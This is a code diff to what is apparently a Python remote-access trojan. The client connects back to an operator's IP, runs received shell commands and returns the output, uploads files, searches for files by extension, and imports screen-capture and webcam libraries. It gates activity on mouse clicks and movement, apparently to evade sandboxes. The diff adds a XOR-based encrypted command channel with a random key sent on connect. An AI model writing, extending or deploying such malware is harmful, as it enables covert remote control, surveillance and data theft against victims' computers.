@@ -1,4 +1,4 @@
-import socket,subprocess,os,time,tempfile,multiprocessing,sys,random,cv2
+import socket,subprocess,os,time,tempfile,multiprocessing,sys,random,cv2,string
 from Cryptodome.PublicKey import RSA
 from Cryptodome.Cipher import PKCS1_OAEP
 from mss import mss
@@ -76,12 +76,16 @@ Xirhv+SRkx4n2goPkwlvZzV53DJIrRwDKj2uLnQuxmU+nIHYuOx8T76qtD8kDB6c
 orLLHeprYymERZe1T1WyjpSOIoQqhf1pxCDlbqcqnl+yP521E4Ze/Q7abdmAJ8SJ
 uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
 -----END RSA PRIVATE KEY-----'''
+        self.key = ""
         self.IP = IP
         self.PORT = PORT
         self.clicks = 0
         self.max_clicks = random.randint(5,15)
         self.max_move = random.randint(5000,15000)
         self.move = 0
+
+    def str_xor(self, s1,s2):
+        return "".join([chr( ord(c1) ^ ord(c2) ) for (c1,c2) in zip(s1,s2)])
 
     def on_move(self,x, y):
         self.move += 1
@@ -114,8 +118,10 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
         try:
             self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             self.connection.connect((IP,PORT))
-            self.r_send(self.exec_cmd("whoami"))
-        except:
+            self.key = "".join(random.choice(string.ascii_lowercase + string.ascii_uppercase + string.digits) for _ in range(0,1024))
+            self.r_send(self.key)
+            self.x_send(self.exec_cmd("whoami"))
+        except Exception as e:
             time.sleep(2)
             self.connect(self.IP, self.PORT)
       
@@ -129,7 +135,38 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
             return (stderr)
         else:
             return ''
+
+    def x_send(self,msg):
+        encrypted = ""
+        if(len(msg)>1024):
+            for i in range(0,len(msg),1024):
+                chunk = msg[0+i:1024+i]
+                encrypted += self.str_xor(chunk,self.key)
+            encrypted = encrypted.encode()
+        else:  
+            encrypted = self.str_xor(msg, self.key).encode()
+        encrypted += "done".encode()
+        self.connection.send(encrypted)
     
+
+
+    def x_recv(self):
+        data = "".encode()
+        while not data.endswith("done".encode()):
+            data += self.connection.recv(MAX)
+        data = data[:-4]
+        data = data.decode()
+        decrypted = ""
+        if len(data)>1024:
+            for i in range(0,len(data),1024):
+                chunk = data[i+0:i+1024]
+                decrypted += self.str_xor(chunk,self.key)
+        else:
+            decrypted = self.str_xor(data,self.key)
+        return decrypted
+
+
+
     def r_send(self, msg):
         msg = msg.encode()
         encrypted = "".encode()
@@ -142,28 +179,15 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
         encrypted += "done".encode()
         self.connection.send(encrypted)
 
-    def r_recv(self):
-        data = "".encode()
-        while not data.endswith("done".encode()):
-            data += self.connection.recv(MAX)
-        data = data[:-4]
-        decrypted = ""
-        if len(data)>512:
-            for i in range(0,len(data),512):
-                chunk = data[i+0:i+512]
-                decrypted += self.decrypt(chunk)
-        else:
-            decrypted = self.decrypt(data)
-        return decrypted
     
     def change_dir(self,dirr):
         try:
             os.chdir(dirr)
-            self.r_send(self.exec_cmd("cd"))
+            self.x_send(self.exec_cmd("cd"))
         except AttributeError:
-            self.r_send(self.exec_cmd("pwd"))
+            self.x_send(self.exec_cmd("pwd"))
         except Exception as e:
-            self.r_send(str(e))
+            self.x_send(str(e))
         
     def upload(self,filename):
         if os.path.exists(filename):
@@ -197,7 +221,7 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
             for file in files:
                 if file.endswith(ext):
                     res += os.path.join(root, file) + '\n'
-        self.r_send(res)
+        self.x_send(res)
 
     def shortcut_path (self, shortcutfile):
         link = pythoncom.CoCreateInstance (shell.CLSID_ShellLink,None,pythoncom.CLSCTX_INPROC_SERVER,shell.IID_IShellLink)
@@ -261,7 +285,7 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
         self.connect(self.IP, self.PORT)
         while(True):
             try:
-                cmd = self.r_recv()
+                cmd = self.x_recv()
                 cmd = cmd.split(' ')
                 if cmd[0] == "cd" and len(cmd)>1:
                     self.change_dir(cmd[1])
@@ -284,7 +308,7 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
                 elif len(cmd)>0:
                     cmd = ' '.join(cmd)
                     result = self.exec_cmd(cmd)
-                    self.r_send(result)
+                    self.x_send(result)
             except:
                 self.connect(self.IP, self.PORT)
 
